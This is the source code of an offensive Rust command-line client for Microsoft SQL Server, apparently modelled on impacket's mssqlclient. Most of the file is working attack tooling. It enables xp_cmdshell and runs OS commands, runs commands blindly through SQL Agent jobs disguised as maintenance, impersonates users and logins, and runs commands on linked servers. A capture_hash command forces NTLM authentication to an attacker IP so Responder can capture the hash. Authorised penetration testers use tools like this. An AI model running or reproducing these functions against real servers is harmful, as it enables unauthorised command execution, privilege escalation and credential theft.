use anyhow::{Context, Result};
use clap::Parser;
use futures::TryStreamExt;
use rustyline::DefaultEditor;
use tiberius::{AuthMethod, Client, Config, Query, Row};
use tokio::net::TcpStream;
use tokio_util::compat::TokioAsyncWriteCompatExt;


#[derive(Parser, Debug)]
#[command(
    name = "mssqlclient",
    
    override_usage = "mssqlclient [domain/]username[:password]@host [OPTIONS]"
)]
struct Args {
    /// Target in format [domain/]username[:password]@host
    #[arg(value_name = "target")]
    target: String,

    /// MSSQL TCP port
    #[arg( short = 'P', default_value_t = 1433)]
    port: u16,

    /// Database name
    #[arg(long = "db", short = 'd')]
    database: Option<String>,

    /// Use Windows authentication (NTLM/Kerberos)
    #[arg(long = "windows-auth", short = 'w')]
    windows_auth: bool,

    /// Execute a single SQL query then exit
    #[arg(long = "query", short = 'Q')]
    query: Option<String>,

    /// Execute SQL statements from file then exit
    #[arg(long = "file", short = 'f')]
    file: Option<String>,

    /// Show SQL queries before execution 
    #[arg(long = "show-queries", short = 's')]
    show: bool,

    /// No TLS (plain TCP, for old MSSQL versions)
    #[arg(long = "no-tls")]
    no_tls: bool,

    /// Verbose / debug output
    #[arg(long = "verbose", short = 'v')]
    debug: bool,
}


#[derive(Debug)]
struct Target {
    domain:   String,
    username: String,
    password: Option<String>,
    host:     String,
}

impl Target {
    /// Parse impacket-style target string:
    ///   [domain/]username[:password]@host
    fn parse(raw: &str) -> Result<Self> {
        // Split on last '@' to get credentials@host
        let at_pos = raw.rfind('@')
            .with_context(|| format!(
                "Invalid target '{}'\nExpected format: [domain/]username[:password]@host",
                raw
            ))?;

        let creds = &raw[..at_pos];
        let host  = raw[at_pos + 1..].to_string();

        if host.is_empty() {
            anyhow::bail!("Missing host in target '{}'", raw);
        }

        // Split domain/username
        let (domain, userpass) = if let Some(slash) = creds.find('/') {
            (creds[..slash].to_string(), &creds[slash + 1..])
        } else {
            (String::new(), creds)
        };

        // Split username:password
        let (username, password) = if let Some(colon) = userpass.find(':') {
            (
                userpass[..colon].to_string(),
                Some(userpass[colon + 1..].to_string()),
            )
        } else {
            (userpass.to_string(), None)
        };

        if username.is_empty() {
            anyhow::bail!("Missing username in target '{}'", raw);
        }

        Ok(Target { domain, username, password, host })
    }
}


fn print_banner() {
    println!("  mssqlclient — Rust client | Inspired by impacket mssqlclient.py\n");
}



fn row_val(row: &Row, idx: usize) -> String {
    use tiberius::ColumnData;
    let cell_data = row.cells().nth(idx).map(|(_, d)| d);
    let cell_data = match cell_data { Some(d) => d, None => return "NULL".to_string() };
    match cell_data {
        ColumnData::String(ref s) =>
            s.as_deref().unwrap_or("NULL").to_string(),

        ColumnData::U8(v)  => v.map(|x| x.to_string()).unwrap_or_else(|| "NULL".into()),
        ColumnData::I16(v) => v.map(|x| x.to_string()).unwrap_or_else(|| "NULL".into()),
        ColumnData::I32(v) => v.map(|x| x.to_string()).unwrap_or_else(|| "NULL".into()),
        ColumnData::I64(v) => v.map(|x| x.to_string()).unwrap_or_else(|| "NULL".into()),

        ColumnData::Bit(v) => v
            .map(|x| if x { "true" } else { "false" })
            .unwrap_or("NULL")
            .to_string(),

        ColumnData::F32(v) => v.map(|x| {
            let s = format!("{}", x);
            if s.contains('.') { s } else { format!("{}.0", s) }
        }).unwrap_or_else(|| "NULL".into()),
        ColumnData::F64(v) => v.map(|x| {
            let s = format!("{}", x);
            if s.contains('.') { s } else { format!("{}.0", s) }
        }).unwrap_or_else(|| "NULL".into()),

        ColumnData::Numeric(ref n) =>
            n.map(|x| x.to_string()).unwrap_or_else(|| "NULL".into()),

        ColumnData::Guid(ref g) =>
            g.map(|x| x.to_string()).unwrap_or_else(|| "NULL".into()),

        ColumnData::Binary(ref b) => b.as_deref()
            .map(|bytes| {
                let hex: String = bytes.iter().map(|b| format!("{:02x}", b)).collect();
                format!("0x{}", hex)
            })
            .unwrap_or_else(|| "NULL".into()),

        ColumnData::Xml(ref x) => x.as_deref()
            .map(|xml| xml.to_string())
            .unwrap_or_else(|| "NULL".into()),

        ColumnData::DateTime(ref dt) => dt
            .map(|d| format!("{:?}", d))
            .unwrap_or_else(|| "NULL".into()),
        ColumnData::SmallDateTime(ref dt) => dt
            .map(|d| format!("{:?}", d))
            .unwrap_or_else(|| "NULL".into()),

        ColumnData::Time(ref t) => t
            .map(|d| format!("{:?}", d))
            .unwrap_or_else(|| "NULL".into()),
        ColumnData::Date(ref d) => d
            .map(|d| format!("{:?}", d))
            .unwrap_or_else(|| "NULL".into()),
        ColumnData::DateTime2(ref dt) => dt
            .map(|d| format!("{:?}", d))
            .unwrap_or_else(|| "NULL".into()),
        ColumnData::DateTimeOffset(ref dt) => dt
            .map(|d| format!("{:?}", d))
            .unwrap_or_else(|| "NULL".into()),
    }
}

fn print_results(rows: &[Row]) {
    if rows.is_empty() {
        println!("[*] (0 rows)");
        return;
    }
    let col_names: Vec<String> = rows[0].columns().iter().map(|c| c.name().to_string()).collect();
    let ncols = col_names.len();

    let data: Vec<Vec<String>> = rows.iter()
        .map(|r| (0..ncols).map(|i| row_val(r, i)).collect())
        .collect();

    let mut widths: Vec<usize> = col_names.iter().map(|n| n.len()).collect();
    for row in &data {
        for (i, v) in row.iter().enumerate() {
            let w = v.len().min(100);
            if w > widths[i] { widths[i] = w; }
        }
    }

 
    let hdr: Vec<String> = col_names.iter().enumerate()
        .map(|(i, n)| format!("{:<w$}", n, w = widths[i])).collect();
    println!("{}", hdr.join("  "));

    println!("{}",
        widths.iter().map(|w| "-".repeat(*w)).collect::<Vec<_>>().join("  "));

    for row in &data {
        let line: Vec<String> = row.iter().enumerate()
            .map(|(i, v)| {
                // Truncate if over max width
                let display = if v.len() > widths[i] { &v[..widths[i]] } else { v.as_str() };
                let padded   = format!("{:<w$}", display, w = widths[i]);
                // Color hints
                if v == "NULL"  { format!("{}", padded) }
                else if v == "true"  { format!("{}", padded) }
                else if v == "false" { format!("{}", padded) }
                else { padded }
            }).collect();
        println!("{}", line.join("  "));
    }

    // Row count footer
    println!();
    println!("({} row{})", rows.len(), if rows.len() == 1 { "" } else { "s" });
    println!();
}



struct SqlShell {
    client: Client<tokio_util::compat::Compat<TcpStream>>,
    show: bool,
}

impl SqlShell {
    fn new(client: Client<tokio_util::compat::Compat<TcpStream>>, show: bool) -> Self {
        Self { client, show }
    }

    async fn run_sql(&mut self, sql: &str) -> Result<Vec<Row>> {
        if self.show {
            println!("[%] {}", sql);
        }
        let mut stream = Query::new(sql).query(&mut self.client).await?;
        let mut rows = Vec::new();
        while let Some(item) = stream.try_next().await? {
            if let tiberius::QueryItem::Row(row) = item {
                rows.push(row);
            }
        }
        Ok(rows)
    }

    async fn qp(&mut self, sql: &str) {
        match self.run_sql(sql).await {
            Ok(rows) => print_results(&rows),
            Err(e)   => eprintln!("[-] SQL Error: {}", e),
        }
    }



    async fn enable_xp_cmdshell(&mut self) {
        println!("[*] Enabling xp_cmdshell...");
        self.qp("EXEC master.dbo.sp_configure 'show advanced options', 1; RECONFIGURE;").await;
        self.qp("EXEC master.dbo.sp_configure 'xp_cmdshell', 1; RECONFIGURE;").await;
        println!("[+] xp_cmdshell enabled");
    }

    async fn disable_xp_cmdshell(&mut self) {
        println!("[*] Disabling xp_cmdshell...");
        self.qp("EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;").await;
        println!("[+] xp_cmdshell disabled");
    }

    async fn xp_cmdshell(&mut self, cmd: &str) {
        if cmd.is_empty() { eprintln!("[-] Usage: xp_cmdshell <command>"); return; }
        let sql = format!("EXEC master..xp_cmdshell '{}'", cmd.replace('\'', "''"));
        self.qp(&sql).await;
    }

    async fn xp_dirtree(&mut self, path: &str) {
        let p = if path.is_empty() { "C:\\" } else { path };
        let sql = format!("EXEC master.sys.xp_dirtree '{}', 1, 1", p.replace('\'', "''"));
        self.qp(&sql).await;
    }

    async fn sp_start_job(&mut self, cmd: &str) {
        if cmd.is_empty() { eprintln!("[-] Usage: sp_start_job <command>"); return; }
        let sql = format!(
            "DECLARE @j NVARCHAR(100); SET @j='svc_'+CONVERT(NVARCHAR(36),NEWID()); \
             EXEC msdb..sp_add_job @job_name=@j,@description='maint',@owner_login_name='sa',@delete_level=3; \
             EXEC msdb..sp_add_jobstep @job_name=@j,@step_id=1,@step_name='s1',@subsystem='CMDEXEC',@command='{}',@on_success_action=1; \
             EXEC msdb..sp_add_jobserver @job_name=@j; EXEC msdb..sp_start_job @job_name=@j;",
            cmd.replace('\'', "''")
        );
        self.qp(&sql).await;
        println!("[*] Agent job queued (blind — no output)");
    }

    async fn enum_db(&mut self) {
        println!("[*] Databases:");
        self.qp("SELECT name, is_trustworthy_on, state_desc, collation_name FROM sys.databases ORDER BY name").await;
    }

    async fn enum_links(&mut self) {
        println!("[*] Linked servers:");
        self.qp("EXEC sp_linkedservers").await;
        self.qp("EXEC sp_helplinkedsrvlogin").await;
    }

    async fn enum_users(&mut self) {
        println!("[*] Database users:");
        self.qp("EXEC sp_helpuser").await;
    }

    async fn enum_logins(&mut self) {
        println!("[*] Server logins:");
        self.qp("SELECT r.name, r.type_desc, r.is_disabled, \
                 sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin \
                 FROM master.sys.server_principals r \
                 LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid \
                 WHERE r.type IN ('S','E','X','U','G') ORDER BY sl.sysadmin DESC, r.name").await;
    }

    async fn enum_owner(&mut self) {
        println!("[*] Database owners:");
        self.qp("SELECT name AS [Database], SUSER_SNAME(owner_sid) AS [Owner], state_desc FROM sys.databases ORDER BY name").await;
    }

    async fn enum_impersonate(&mut self) {
        println!("[*] Impersonation rights (login):");
        self.qp("SELECT 'LOGIN' AS [Type], pe.permission_name, pe.state_desc, pr.name AS [Grantee], pr2.name AS [Grantor] \
                 FROM sys.server_permissions pe \
                 JOIN sys.server_principals pr  ON pe.grantee_principal_id = pr.principal_id \
                 JOIN sys.server_principals pr2 ON pe.grantor_principal_id = pr2.principal_id \
                 WHERE pe.type = 'IM'").await;
        println!("[*] Impersonation rights (user):");
        self.qp("SELECT 'USER' AS [Type], DB_NAME() AS [DB], pe.permission_name, pe.state_desc, pr.name AS [Grantee], pr2.name AS [Grantor] \
                 FROM sys.database_permissions pe \
                 JOIN sys.database_principals pr  ON pe.grantee_principal_id = pr.principal_id \
                 JOIN sys.database_principals pr2 ON pe.grantor_principal_id = pr2.principal_id \
                 WHERE pe.type = 'IM'").await;
    }

    async fn exec_as_user(&mut self, user: &str) {
        if user.is_empty() { eprintln!("[-] Usage: exec_as_user <user>"); return; }
        self.qp(&format!("EXECUTE AS USER='{}'", user.replace('\'', "''"))).await;
        println!("[+] Context → USER '{}'", user);
    }

    async fn exec_as_login(&mut self, login: &str) {
        if login.is_empty() { eprintln!("[-] Usage: exec_as_login <login>"); return; }
        self.qp(&format!("EXECUTE AS LOGIN='{}'", login.replace('\'', "''"))).await;
        println!("[+] Context → LOGIN '{}'", login);
    }

    async fn revert(&mut self) {
        self.qp("REVERT").await;
        println!("[+] Context reverted");
    }

    async fn info(&mut self) {
        println!("[*] Server info:");
        self.qp("SELECT @@VERSION AS [Version], @@SERVERNAME AS [ServerName], \
                 SYSTEM_USER AS [Login], USER_NAME() AS [User], DB_NAME() AS [DB], \
                 IS_SRVROLEMEMBER('sysadmin') AS [IsSysAdmin]").await;
    }

    async fn capture_hash(&mut self, ip: &str) {
        if ip.is_empty() { eprintln!("[-] Usage: capture_hash <attacker_ip>"); return; }
        println!("[*] Triggering NTLM auth to {} — run Responder/ntlmrelayx", ip);
        let sql = format!("EXEC master..xp_dirtree '\\\\{}\\share'", ip.replace('\'', "''"));
        self.qp(&sql).await;
    }

    async fn linked_query(&mut self, server: &str, query: &str) {
        if server.is_empty() || query.is_empty() {
            eprintln!("[-] Usage: linked_query <server> <sql>"); return;
        }
        let sql = format!("SELECT * FROM OPENQUERY([{}], '{}')",
            server.replace(']', "]]"), query.replace('\'', "''"));
        self.qp(&sql).await;
    }

    async fn linked_exec(&mut self, server: &str, cmd: &str) {
        if server.is_empty() || cmd.is_empty() {
            eprintln!("[-] Usage: linked_exec <server> <cmd>"); return;
        }
        let sql = format!("EXEC ('EXEC master..xp_cmdshell ''{}'' ') AT [{}]",
            cmd.replace('\'', "''"), server.replace(']', "]]"));
        self.qp(&sql).await;
    }

    fn help(&self) {
        ;
        println!("  ┌────────────────────────────────────────────────────────────────┐");
        println!("  │             mssqlclient  —  Command Reference                  │");
        println!("  └────────────────────────────────────────────────────────────────┘");
        println!();
        println!("  GENERAL");
        println!("    help                          Show this help");
        println!("    exit | quit                   Disconnect");
        println!("    info                          Server info & sysadmin status");
        println!("    show_query / mask_query        Toggle SQL echo");
        println!();
        println!("  SQL");
        println!("    <any T-SQL>                   Execute raw query");
        println!();
        println!("  COMMAND EXECUTION");
        println!("    enable_xp_cmdshell            Enable xp_cmdshell");
        println!("    disable_xp_cmdshell           Disable xp_cmdshell");
        println!("    xp_cmdshell <cmd>             OS command via xp_cmdshell");
        println!("    xp_dirtree [path]             Directory listing (default: C:\\)");
        println!("    sp_start_job <cmd>            Blind OS exec via SQL Server Agent");
        println!();
        println!("  ENUMERATION");
        println!("    enum_db                       Databases (+ trustworthy)");
        println!("    enum_links                    Linked servers");
        println!("    enum_users                    DB users");
        println!("    enum_logins                   Server logins + role flags");
        println!("    enum_owner                    DB owners");
        println!("    enum_impersonate              Impersonation rights");
        println!();
        println!("  IMPERSONATION");
        println!("    exec_as_user <user>           EXECUTE AS USER");
        println!("    exec_as_login <login>         EXECUTE AS LOGIN");
        println!("    revert                        Revert to original context");
        println!();
        println!("  LINKED SERVERS");
        println!("    linked_query <srv> <sql>      OPENQUERY on linked server");
        println!("    linked_exec  <srv> <cmd>      xp_cmdshell via linked server");
        println!();
        println!("  HASH CAPTURE");
        println!("    capture_hash <ip>             Force NTLM auth (use with Responder)");
        ;
    }


    async fn dispatch(&mut self, line: &str) {
        let t = line.trim();
        if t.is_empty() { return; }
        let (cmd, args) = match t.find(' ') {
            Some(i) => (&t[..i], t[i+1..].trim()),
            None    => (t, ""),
        };
        match cmd.to_lowercase().as_str() {
            "help" | "?"          => self.help(),
            "exit" | "quit"       => { println!("[*] Bye!"); std::process::exit(0); }
            "info"                => self.info().await,
            "enable_xp_cmdshell"  => self.enable_xp_cmdshell().await,
            "disable_xp_cmdshell" => self.disable_xp_cmdshell().await,
            "xp_cmdshell"         => self.xp_cmdshell(args).await,
            "xp_dirtree"          => self.xp_dirtree(args).await,
            "sp_start_job"        => self.sp_start_job(args).await,
            "enum_db"             => self.enum_db().await,
            "enum_links"          => self.enum_links().await,
            "enum_users"          => self.enum_users().await,
            "enum_logins"         => self.enum_logins().await,
            "enum_owner"          => self.enum_owner().await,
            "enum_impersonate"    => self.enum_impersonate().await,
            "exec_as_user"        => self.exec_as_user(args).await,
            "exec_as_login"       => self.exec_as_login(args).await,
            "revert"              => self.revert().await,
            "capture_hash"        => self.capture_hash(args).await,
            "linked_query" => {
                let p: Vec<&str> = args.splitn(2, ' ').collect();
                if p.len() < 2 { eprintln!("[-] Usage: linked_query <server> <sql>"); }
                else { self.linked_query(p[0], p[1]).await; }
            }
            "linked_exec" => {
                let p: Vec<&str> = args.splitn(2, ' ').collect();
                if p.len() < 2 { eprintln!("[-] Usage: linked_exec <server> <cmd>"); }
                else { self.linked_exec(p[0], p[1]).await; }
            }
            "show_query" => { self.show = true;  println!("[+] Query echo ON"); }
            "mask_query" => { self.show = false; println!("[*] Query echo OFF"); }
            _            => self.qp(t).await,
        }
    }

    async fn run_interactive(&mut self) -> Result<()> {
        let mut rl = DefaultEditor::new()?;
        println!("[!] Type 'help' for commands. 'exit' to quit.\n");
        loop {
            match rl.readline("SQL> ") {
                Ok(line) => {
                    let _ = rl.add_history_entry(line.as_str());
                    self.dispatch(&line).await;
                }
                Err(rustyline::error::ReadlineError::Interrupted) => {
                    println!("[*] Ctrl+C (type 'exit' to quit)");
                }
                Err(rustyline::error::ReadlineError::Eof) => break,
                Err(e) => { eprintln!("[-] {}", e); break; }
            }
        }
        Ok(())
    }
}


async fn connect(
    target: &Target,
    password: &str,
    port: u16,
    database: Option<&str>,
    windows_auth: bool,
    no_tls: bool,
    debug: bool,
) -> Result<Client<tokio_util::compat::Compat<TcpStream>>> {
    let mut config = Config::new();

    config.host(&target.host);
    config.port(port);

    if windows_auth {
        // On Windows with the winauth feature, use integrated Windows auth.
        // On Linux (gssapi/kerberos not compiled in by default), fall back to
        // SQL auth with DOMAIN\user — some setups accept this over the wire.
        #[cfg(windows)]
        {
            config.authentication(AuthMethod::windows(
                format!("{}\\{}", target.domain, target.username),
                password,
            ));
        }
        #[cfg(not(windows))]
        {
            // Linux fallback: pass domain\user as SQL login
            // (works when MSSQL is configured to accept these credentials)
            let user = if target.domain.is_empty() {
                target.username.clone()
            } else {
                format!("{}\\{}", target.domain, target.username)
            };
            config.authentication(AuthMethod::sql_server(user, password));
        }
    } else {
        config.authentication(AuthMethod::sql_server(&target.username, password));
    }

    // TLS
    if no_tls {
        config.encryption(tiberius::EncryptionLevel::NotSupported);
    } else {
        config.trust_cert(); // Accept self-signed (common in lab/pentest envs)
    }

    if let Some(db) = database {
        config.database(db);
    }

    let host_port = format!("{}:{}", target.host, port);
    if debug {
        eprintln!("[DEBUG] Resolving {}", host_port);
    }

    let addr = tokio::net::lookup_host(&host_port)
        .await
        .with_context(|| format!("DNS resolution failed for '{}'", target.host))?
        .next()
        .with_context(|| format!("No address found for '{}'", target.host))?;

    if debug {
        eprintln!("[DEBUG] Resolved to {}", addr);
    }

    let tcp = TcpStream::connect(addr).await
        .with_context(|| format!("TCP connection refused: {}:{}", target.host, port))?;
    tcp.set_nodelay(true)?;

    let client = Client::connect(config, tcp.compat_write()).await
        .context("TDS handshake failed — wrong credentials or SQL Server unreachable")?;

    Ok(client)
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();
    print_banner();

    let mut target = Target::parse(&args.target)
        .with_context(|| "Failed to parse target")?;

    let password = match target.password.take() {
        Some(p) => p,
        None => {
            let prompt = format!(
                "Password for {}{}@{}: ",
                if target.domain.is_empty() { String::new() } else { format!("{}\\", target.domain) },
                target.username,
                target.host,
            );
            rpassword::prompt_password(prompt)?
        }
    };

    let auth_label = if args.windows_auth { "Windows/NTLM" } else { "SQL Server" };
    println!(
        "[*] Connecting → {}{} @ {}:{} [{}]",
        if target.domain.is_empty() { String::new() } else { format!("{}\\", target.domain) },
        target.username,
        target.host,
        args.port,
        auth_label,
    );

    let client = connect(
        &target,
        &password,
        args.port,
        args.database.as_deref(),
        args.windows_auth,
        args.no_tls,
        args.debug,
    ).await?;

    println!("[+] Authentication successful!");

    let mut shell = SqlShell::new(client, args.show);
    shell.info().await;

    // Execution mode
    if let Some(q) = args.query.clone() {
        println!("SQL> {}", q);
        shell.dispatch(&q).await;
    } else if let Some(fp) = args.file.clone() {
        let content = std::fs::read_to_string(&fp)
            .with_context(|| format!("Cannot open file: {}", fp))?;
        for line in content.lines() {
            let line = line.trim();
            if line.is_empty() || line.starts_with("--") { continue; }
            println!("SQL> {}", line);
            shell.dispatch(line).await;
        }
    } else {
        shell.run_interactive().await?;
    }

    println!("[*] Disconnected.");
    Ok(())
}